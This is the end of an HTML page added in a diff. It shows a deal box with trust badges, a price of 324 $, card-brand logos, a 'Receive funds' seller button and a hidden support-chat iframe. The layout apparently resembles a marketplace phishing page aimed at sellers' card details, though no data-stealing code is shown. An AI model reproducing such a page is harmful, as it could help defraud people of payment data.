NDVDNC4zMDUyMiAyNS4yODg1IDUuMjkwMTggMjUuNzAwOCA1LjcwMjUgMjYuMTM2QzYuMDkxOSAyNi41MjU0IDYuNDgxMzEgMjcuNDE4OCA2LjkxNjUzIDI4LjQ0OTVMNy4wNTM5NiAyOC43NzAyQzcuNTEyMDkgMjkuODY5NyA4LjAzODkzIDMxLjEwNjcgOS4zNDQ1OSAzMS42NzkzQzkuNzMzOTkgMzEuODM5NyAxMC4xNDYzIDMxLjkwODQgMTAuNTgxNSAzMS45MDg0QzExLjQ1MiAzMS45MDg0IDEyLjI5OTUgMzEuNTg3NyAxMy4yMTU3IDMxLjI0NDFDMTQuMzM4MSAzMC44MDg5IDE1LjMwMDIgMzAuNDQyNCAxNS44NzI5IDMwLjQ0MjRDMTYuNDY4NCAzMC40NDI0IDE3LjQ3NjMgMzAuODU0NyAxOC42Njc0IDMxLjM1ODZDMTkuNDIzMyAzMS42NTY0IDIwLjI5MzggMzIgMjEuMTg3MSAzMkMyMS41OTk0IDMyIDIyLjAxMTcgMzEuOTMxMyAyMi4zNzgyIDMxLjc3MDlDMjMuNzA2OCAzMS4yNDQxIDI0LjI3OTQgMjkuOTYxMyAyNC44MjkyIDI4LjcwMTVDMjUuMzEwMiAyNy42MjQ5IDI1LjcyMjUgMjYuNjg1OCAyNi4xMzQ5IDI2LjI5NjNDMjYuNTQ3MiAyNS44NjExIDI3LjYyMzggMjUuNDI1OSAyOC43NDYyIDI0Ljk0NDlDMjkuNzk5OSAyNC41MDk3IDMxLjA4MjYgMjMuOTU5OSAzMS42NTUzIDIyLjYzMTRDMzIuMjA1IDIxLjMyNTcgMzEuNzAxMSAxOS45NzQyIDMxLjI0MjkgMTguODA2QzMwLjgzMDYgMTcuNzI5NCAzMC40MTgzIDE2LjY5ODYgMzAuNDE4MyAxNi4xMjZaTTI1LjgxNDIgMTYuMDExNUMyNS44MTQyIDIxLjQxNzMgMjEuNDE2MiAyNS44MTUzIDE1Ljk4NzQgMjUuODE1M0MxMC41ODE1IDI1LjgxNTMgNi4xNjA2MiAyMS40MTczIDYuMTYwNjIgMTYuMDExNUM2LjE2MDYyIDEwLjU4MjcgMTAuNTgxNSA2LjE4NDY4IDE1Ljk4NzQgNi4xODQ2OEMyMS40MTYyIDYuMTg0NjggMjUuODE0MiAxMC41ODI3IDI1LjgxNDIgMTYuMDExNVoiIGZpbGw9IiNDQzFFMkIiLz4NCjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMTUuOTg4NiAyNS44MTU2QzIxLjQxNzMgMjUuODE1NiAyNS44MTUzIDIxLjQxNzYgMjUuODE1MyAxNi4wMTE3QzI1LjgxNTMgMTAuNTgyOSAyMS40MTczIDYuMTg0OTQgMTUuOTg4NiA2LjE4NDk0QzEwLjU4MjcgNi4xODQ5NCA2LjE2MTggMTAuNTgyOSA2LjE2MTggMTYuMDExN0M2LjE2MTggMjEuNDE3NiAxMC41ODI3IDI1LjgxNTYgMTUuOTg4NiAyNS44MTU2Wk0xNC4yNDU3IDIxLjA0MTVMMjMuNTYxNyAxMi45MDM3QzI0LjA4NjUgMTIuNDQ5OCAyNC4xNTIxIDExLjY3MTcgMjMuNjkyOSAxMS4xMjA2QzIzLjQ2MzMgMTAuODYxMiAyMy4xNjgxIDEwLjczMTUgMjIuOTM4NCAxMC42NjY3SDIyLjkwNTZMMjIuNzQxNiAxMC42OTkxSDIyLjY0MzJDMjIuMzQ4IDEwLjczMTUgMjIuMDg1NiAxMC44Mjg4IDIxLjg4ODcgMTEuMDIzM0wxMy41NTY5IDE4LjMxODFMMTAuMzA5NCAxNC42MjIxQzEwLjA3OTggMTQuMjk3OSA5LjY4NjE3IDE0LjEzNTggOS4yOTI1NCAxNC4xMzU4QzkuMDMwMTIgMTQuMTM1OCA4LjczNDkgMTQuMjAwNiA4LjUzODA4IDE0LjM2MjdDNy45ODA0NCAxNC43ODQyIDcuODQ5MjMgMTUuNTk0NyA4LjE3NzI1IDE2LjAxNjJMMTIuNDc0NCAyMC45MTE5QzEyLjcwNCAyMS4xNzEyIDEzLjA2NDggMjEuMzMzMyAxMy40MjU3IDIxLjMzMzNDMTMuNjU1MyAyMS4zMzMzIDEzLjk1MDUgMjEuMjY4NSAxNC4yNDU3IDIxLjA0MTVaIiBmaWxsPSIjQ0MxRTJCIi8+DQo8L2c+DQo8ZGVmcz4NCjxjbGlwUGF0aCBpZD0iY2xpcDAiPg0KPHJlY3Qgd2lkdGg9IjMyIiBoZWlnaHQ9IjMyIiBmaWxsPSJ3aGl0ZSIvPg0KPC9jbGlwUGF0aD4NCjwvZGVmcz4NCjwvc3ZnPg==" alt="" srcset=""> 
+       <div class="lek"> 
+        <div class="s_z">
+         Certified by authorised partners
+        </div> 
+        <div class="s_t">
+         Free 1 month warranty and 7 days returns.
+        </div> 
+       </div> 
+      </div> 
+     </div> 
+     <div class="ap_box"> 
+      <div class="pok"> 
+       <div class="it"> 
+        <div class="des">
+         Details
+        </div> 
+        <div class="kk">
+         Price 324 $ 
+        </div> 
+       </div> 
+       <div class="it"> 
+        <div class="des">
+         Payment
+        </div> 
+        <div class="type"> 
+         <img src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgNTAgMjgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHJlY3QgeD0iMSIgeT0iLjUiIHdpZHRoPSI0OCIgaGVpZ2h0PSIyNyIgcng9IjEuNSIgZmlsbD0iI2ZmZiIvPjxwYXRoIGQ9Ik0xNi42NDMgMjMuOTQ3di0xLjMyOGEuNzc4Ljc3OCAwIDAgMC0uMjMtLjYwOS44MDguODA4IDAgMCAwLS42MTctLjIzMi44NDMuODQzIDAgMCAwLS43NTguMzc2Ljc5Mi43OTIgMCAwIDAtLjcxMy0uMzc2LjcyLjcyIDAgMCAwLS42My4zMTN2LS4yNjFoLS40N3YyLjExN2guNDczdi0xLjE3NGEuNDg4LjQ4OCAwIDAgMSAuMTMtLjQwMy41MDkuNTA5IDAgMCAxIC4zOTgtLjE2Yy4zMTEgMCAuNDY5LjIuNDY5LjU2djEuMTc3aC40NzR2LTEuMTc0YS40OS40OSAwIDAgMSAuMTMtLjQwMS41MS41MSAwIDAgMSAuMzk4LS4xNjFjLjMyIDAgLjQ3Mi4yLjQ3Mi41NTh2MS4xNzhoLjQ3NFptNy4wMDgtMi4xMTZoLS43Njd2LS42NDNoLS40NzN2LjY0M2gtLjQzOHYuNDJoLjQzOHYuOTY1YzAgLjQ5MS4xOTMuNzg0Ljc0OC43ODQuMjA3IDAgLjQxLS4wNTcuNTg3LS4xNjRsLS4xMzYtLjM5NGEuODc3Ljg3NyAwIDAgMS0uNDE1LjEyYy0uMjM1IDAtLjMxLS4xNDItLjMxLS4zNTV2LS45NTZoLjc2NXYtLjQyWm00LS4wNTNhLjY0LjY0IDAgMCAwLS41NjkuMzF2LS4yNTdoLS40NjR2Mi4xMTZoLjQ2OFYyMi43NmMwLS4zNTEuMTU0LS41NDYuNDYxLS41NDYuMSAwIC4yLjAxOC4yOTIuMDU0bC4xNDUtLjQzNWExLjAxOCAxLjAxOCAwIDAgMC0uMzM0LS4wNTZabS02LjA0OC4yMmExLjYzNyAxLjYzNyAwIDAgMC0uODc5LS4yMmMtLjU0NSAwLS44OTcuMjU2LS44OTcuNjc2IDAgLjM0Ni4yNjIuNTU5Ljc0NC42MjVsLjIyLjAzMWMuMjU4LjAzNS4zOC4xMDIuMzguMjIgMCAuMTY1LS4xNzIuMjU4LS40OTIuMjU4LS4yNTcuMDA4LS41MS0uMDctLjcxNy0uMjIxbC0uMjIxLjM1OGMuMjc0LjE4OC42LjI4NC45MzMuMjc1LjYyMiAwIC45ODQtLjI4Ny45ODQtLjY5IDAtLjM3My0uMjg1LS41NjgtLjc1My0uNjM0bC0uMjIyLS4wMzFjLS4yMDItLjAyNi0uMzY1LS4wNjYtLjM2NS0uMjA4IDAtLjE1NS4xNTMtLjI0OC40MS0uMjQ4LjIzNy4wMDQuNDY4LjA2Ni42NzIuMTgybC4yMDMtLjM3MlptMTIuNTYzLS4yMmEuNjQuNjQgMCAwIDAtLjU2OS4zMXYtLjI1N2gtLjQ2NHYyLjExNmguNDdWMjIuNzZjMC0uMzUxLjE1My0uNTQ2LjQ2LS41NDYuMSAwIC4yLjAxNy4yOTMuMDU0bC4xNDQtLjQzNWExLjAxOCAxLjAxOCAwIDAgMC0uMzM0LS4wNTZabS02LjA0MiAxLjExYy0uMDEzLjMwMi4xMDUuNTk0LjMyNC44MDYuMjE5LjIxMi41Mi4zMjIuODI2LjMwNi4yOC4wMTQuNTU3LS4wNzYuNzc1LS4yNTNsLS4yMjYtLjM3MmEuOTU5Ljk1OSAwIDAgMS0uNTYzLjE5Mi42ODkuNjg5IDAgMCAxLS40Ni0uMjEyLjY4LjY4IDAgMCAxLS4xOS0uNDY3YzAtLjM1OC4yODUtLjY1NS42NS0uNjc3LjIwNC4wMDMuNDAyLjA3LjU2My4xOTFsLjIyNi0uMzcyYTEuMTQzIDEuMTQzIDAgMCAwLS43NzUtLjI1MiAxLjEgMS4xIDAgMCAwLS44MjYuMzA0IDEuMDU4IDEuMDU4IDAgMCAwLS4zMjQuODA2Wm00LjM5MiAwdi0xLjA1N2gtLjQ3di4yNTZhLjgyMS44MjEgMCAwIDAtLjY4LS4zMSAxLjEyIDEuMTIgMCAwIDAtMS4wNzggMS4xMTFjMCAuNTkzLjQ3NCAxLjA4MyAxLjA3OCAxLjExMmEuODI2LjgyNiAwIDAgMCAuNjgtLjMxdi4yNTdoLjQ3di0xLjA1OVptLTEuNzQ1IDBhLjY0NC42NDQgMCAwIDEgLjY3NS0uNjAzLjY0Mi42NDIgMCAwIDEgLjYyOS42NTEuNjQyLjY0MiAwIDAgMS0uNjUuNjMuNjU1LjY1NSAwIDAgMS0uNDc5LS4xOTkuNjI5LjYyOSAwIDAgMS0uMTc1LS40NzhabS01LjY2LTEuMTFhMS4xMjUgMS4xMjUgMCAwIDAtMS4wNzMgMS4xMjVBMS4xMjMgMS4xMjMgMCAwIDAgMjUuMTQzIDI0Yy4zMjIuMDEuNjM2LS4wOTUuODg0LS4yOTdsLS4yMy0uMzRjLS4xNzkuMTQtLjM5OS4yMTctLjYyNi4yMmEuNi42IDAgMCAxLS42NDYtLjUxN2gxLjZhMS45MyAxLjkzIDAgMCAwIC4wMS0uMTc4Yy0uMDA0LS42NTktLjQxOS0xLjExLTEuMDIzLTEuMTFabS0uMDA4LjQxMWEuNTM0LjUzNCAwIDAgMSAuNTQ1LjUxM0gyNC41M2EuNTQ2LjU0NiAwIDAgMSAuNTcyLS41MTNoLjAwMVptMTEuNzY0LjdWMjAuOThoLS40Njl2MS4xMDhhLjgyLjgyIDAgMCAwLS42OC0uMzEgMS4xMiAxLjEyIDAgMCAwLTEuMDc4IDEuMTExQTEuMTIgMS4xMiAwIDAgMCAzNS43MTcgMjRhLjgyNy44MjcgMCAwIDAgLjY4MS0uMzF2LjI1N2guNDY5di0xLjA1OVptLTEuNzQ1IDBhLjY0NC42NDQgMCAwIDEgLjIxNC0uNDQuNjUzLjY1MyAwIDAgMSAuNDYyLS4xNjQuNjQxLjY0MSAwIDAgMSAuNjI5LjY1MS42NTEuNjUxIDAgMCAxLS42NS42My42NTUuNjU1IDAgMCAxLS40OC0uMTk5LjYyNy42MjcgMCAwIDEtLjE3NC0uNDc4aC0uMDAxWm0tMTUuODM2IDBWMjEuODNoLS40N3YuMjU2YS44Mi44MiAwIDAgMC0uNjgtLjMxIDEuMTIgMS4xMiAwIDAgMC0xLjA3OCAxLjExMWMwIC41OTMuNDc0IDEuMDgzIDEuMDc3IDEuMTEyYS44MjYuODI2IDAgMCAwIC42ODEtLjMxdi4yNTdoLjQ3di0xLjA1OVptLTEuNzQ1IDBhLjY0My42NDMgMCAwIDEgLjIxNC0uNDQuNjUzLjY1MyAwIDAgMSAuNDYyLS4xNjQuNjUuNjUgMCAwIDEgLjQ0OC4xOTguNjQuNjQgMCAwIDEgLjE4LjQ1My42NDIuNjQyIDAgMCAxLS42NS42My42NTUuNjU1IDAgMCAxLS40NzgtLjE5OS42MjguNjI4IDAgMCAxLS4xNzYtLjQ3OFoiIGZpbGw9IiMzQzQ4NTgiLz48cGF0aCBkPSJNMjEuNDQ4IDUuNzAzaDcuMTAzdjEyLjUzaC03LjEwM1Y1LjcwNFoiIGZpbGw9IiNGRjVGMDAiLz48cGF0aCBkPSJNMjEuOSAxMS45NjljMC0xLjIxLjI4LTIuNDA0LjgxOC0zLjQ5QTcuOTM0IDcuOTM0IDAgMCAxIDI1IDUuNzA0Yy0zLjMyOC0yLjU2OC04LjEwOC0yLjE5NC0xMC45OC44NTlhNy44NzIgNy44NzIgMCAwIDAtMi4xNTQgNS40MDZjMCAyLjAwOS43NyAzLjk0MiAyLjE1NCA1LjQwNyAyLjg3MiAzLjA1MyA3LjY1MiAzLjQyNiAxMC45OC44NTlhNy45MzIgNy45MzIgMCAwIDEtMi4yODItMi43NzYgNy44NzYgNy44NzYgMCAwIDEtLjgxOC0zLjQ5WiIgZmlsbD0iI0VCMDAxQiIvPjxwYXRoIGQ9Ik0zOC4xMzQgMTEuOTY4YzAgMy4wNTMtMS43NzQgNS44MzUtNC41NyA3LjE2OGE4LjI0NSA4LjI0NSAwIDAgMS04LjU2My0uOTAyIDcuOTQ4IDcuOTQ4IDAgMCAwIDIuMjgtMi43NzYgNy44OTEgNy44OTEgMCAwIDAgLjgyLTMuNDkgNy44OTIgNy44OTIgMCAwIDAtLjgyLTMuNDg5IDcuOTQ4IDcuOTQ4IDAgMCAwLTIuMjgtMi43NzYgOC4yNDUgOC4yNDUgMCAwIDEgOC41NjItLjkwMmMyLjc5NyAxLjMzMyA0LjU3MSA0LjExNyA0LjU3MSA3LjE2N1oiIGZpbGw9IiNGNzlFMUIiLz48cmVjdCB4PSIxIiB5PSIuNSIgd2lkdGg9IjQ4IiBoZWlnaHQ9IjI3IiByeD0iMS41IiBzdHJva2U9IiMzQzQ4NTgiLz48L3N2Zz4=" alt="" srcset=""> 
+         <img src="data:image/svg+xml;base64,PHN2ZyB2aWV3Qm94PSIwIDAgNTAgMjgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHJlY3QgeD0iMSIgeT0iLjUiIHdpZHRoPSI0OCIgaGVpZ2h0PSIyNyIgcng9IjEuNSIgZmlsbD0iI2ZmZiIvPjxwYXRoIGQ9Im0yMS4wMjkgOS4xNzctNC4zMiA5LjY3MmgtMi44MmwtMi4xMjUtNy43MThjLS4xMy0uNDc2LS4yNDEtLjY1LS42MzQtLjg1LS42NDEtLjMyNi0xLjctLjYzMy0yLjYzLS44MjNsLjA2My0uMjhoNC41MzhjLjU3OCAwIDEuMDk4LjM2IDEuMjMuOTg1bDEuMTIyIDUuNTk2IDIuNzc1LTYuNTgzaDIuOFptMTEuMDQ0IDYuNTE0Yy4wMTEtMi41NTMtMy43NjItMi42OTMtMy43MzYtMy44MzQuMDA4LS4zNDcuMzYxLS43MTYgMS4xMzEtLjgxLjM4Mi0uMDQ3IDEuNDM1LS4wODMgMi42My40MzNsLjQ2OC0yLjA1MUE3LjU4MiA3LjU4MiAwIDAgMCAzMC4wNzIgOWMtMi42MzYgMC00LjQ5IDEuMzE1LTQuNTA2IDMuMTk3LS4wMTcgMS4zOTMgMS4zMjMgMi4xNyAyLjMzNCAyLjYzMiAxLjA0LjQ3NCAxLjM4OC43NzggMS4zODQgMS4yMDItLjAwNy42NS0uODI5LjkzNi0xLjU5Ny45NDctMS4zNC4wMi0yLjExOC0uMzQtMi43MzgtLjYxbC0uNDgzIDIuMTE4Yy42MjMuMjY4IDEuNzczLjUwMiAyLjk2NS41MTQgMi44MDIgMCA0LjYzNC0xLjI5OCA0LjY0Mi0zLjMxWm02Ljk2IDMuMTU4SDQxLjVsLTIuMTU0LTkuNjcySDM3LjA3YTEuMjcxIDEuMjcxIDAgMCAwLS42ODMuMTljLS4yMDMuMTI3LS4zNi4zMDgtLjQ1MS41MmwtNC4wMDIgOC45NjJoMi44bC41NTYtMS40NDVoMy40MjFsLjMyMyAxLjQ0NVptLTIuOTc0LTMuNDI3IDEuNDAzLTMuNjMyLjgwOCAzLjYzMmgtMi4yMTJabS0xMS4yMi02LjI0NS0yLjIwNSA5LjY3MmgtMi42NjdsMi4yMDYtOS42NzJoMi42NjZaIiBmaWxsPSIjMTQzNENCIi8+PHJlY3QgeD0iMSIgeT0iLjUiIHdpZHRoPSI0OCIgaGVpZ2h0PSIyNyIgcng9IjEuNSIgc3Ryb2tlPSIjM0M0ODU4Ii8+PC9zdmc+" alt="" srcset=""> 
+        </div> 
+       </div> 
+      </div> 
+      <button class="submit sell" onclick="submit()">Receive funds</button> 
+     </div> 
+    </div> 
+   </div> 
+  </main> 
+  <div class="
+chatra--webkit
+chatra--style-round
+chatra--side-bottom
+chatra--pos-right
+chatra--visible
+chatra--expanded
+chatra--fast-toggle
+" id="chatra" data-turbolinks-permanent="" style="
+width: 380px;
+height: 600px;
+transform: none;
+z-index: 2147483647;
+display: none;
+"> 
+   <div id="chatra__iframe-wrapper"> 
+    <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay" src="/supportChatFrame/192529707" style="width: 380px; height: 600px; position: absolute"></iframe> 
+   </div> 
+  </div> 
+  <div class="support-circle" onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"> 
+  </div> 
+ </body>
+</html>
